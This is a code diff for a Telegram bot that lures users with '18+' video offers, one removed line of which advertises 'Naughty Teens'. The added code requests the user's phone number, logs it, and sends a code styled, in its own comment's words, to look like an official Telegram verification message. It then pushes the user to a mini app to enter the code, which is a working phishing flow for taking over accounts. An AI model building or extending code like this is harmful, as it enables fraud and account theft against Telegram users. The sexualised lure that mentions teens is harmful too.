@@ -27,13 +27,48 @@ def generate_otp():
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info(f"User {update.effective_user.id} started the bot")
+    # First ask for contact (native Telegram button)
     keyboard = [
-        [KeyboardButton("🔞 Watch 18+❤️", web_app=WebAppInfo(url=MINI_APP_URL))]
+        [KeyboardButton("📱 Share My Number", request_contact=True)]
+    ]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+    
+    await update.message.reply_text(
+        "🔐 Welcome! To verify your account, please share your phone number.",
+        reply_markup=reply_markup
+    )
+
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    contact = update.effective_message.contact
+    logger.info(f"User {user_id} shared contact: {contact.phone_number}")
+    
+    # Generate OTP
+    otp = generate_otp()
+    user_otps[user_id] = otp
+    logger.info(f"Generated OTP {otp} for user {user_id}")
+    
+    # Send OTP message that looks like official Telegram message
+    otp_message = (
+        f"🔐 <b>Telegram Verification</b>\n\n"
+        f"Your verification code: <code>{otp}</code>\n\n"
+        f"Please enter this code in the mini app to continue.\n\n"
+        f"This code will expire in 10 minutes."
+    )
+    
+    # Now show the mini app button
+    keyboard = [
+        [KeyboardButton("🔞 Verify & Watch", web_app=WebAppInfo(url=MINI_APP_URL))]
     ]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     
     await update.message.reply_text(
-        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏 Watch Now! 👇",
+        otp_message,
+        parse_mode='HTML'
+    )
+    
+    await update.message.reply_text(
+        "👇 Now click below to verify the code:",
         reply_markup=reply_markup
     )
 
@@ -78,6 +113,7 @@ def main():
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
     
     application.run_polling()
